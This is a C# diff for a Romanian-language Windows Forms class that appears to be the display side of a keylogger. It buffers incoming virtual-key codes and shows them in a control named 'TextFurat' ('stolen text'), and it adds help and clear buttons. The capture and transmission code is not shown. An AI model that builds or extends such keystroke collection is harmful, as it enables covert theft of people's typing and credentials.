@@ -24,6 +24,8 @@ namespace UIModule
     {
         private LoggerWriter _log;
         private String TempFile;
+        private int[] BufferCaractere = new int[5000];
+        private int NumarCaractere = 0;
         public InterfataSimpla(LoggerWriter log)
         {
             var assembly = Assembly.GetExecutingAssembly();
@@ -97,6 +99,8 @@ namespace UIModule
                     if (code != "")
                     {
                         int vkCode = Int16.Parse(code);
+                        BufferCaractere[NumarCaractere] = vkCode;
+                        NumarCaractere++;
                         _log.HandleVK(vkCode, "", TextFurat);
                     }
                 }
@@ -125,6 +129,26 @@ namespace UIModule
         private void SocketDebug_TextChanged(object sender, EventArgs e)
         {
 
+            if (File.Exists(helpFilePath))
+            {
+                Help.ShowHelp(this, helpFilePath);
+            }
+            else
+            {
+                MessageBox.Show("Fișierul de ajutor nu a fost găsit. Verificați calea specificată.\n"+ helpFilePath, "Eroare", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void ButonClear_Click(object sender, EventArgs e)
+        {
+            BufferCaractere = new int[5000];
+            NumarCaractere = 0;
+            TextFurat.Text = "";
+        }
+
+        private void ModAfisare_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            e.Handled = true;
         }
     }
 }
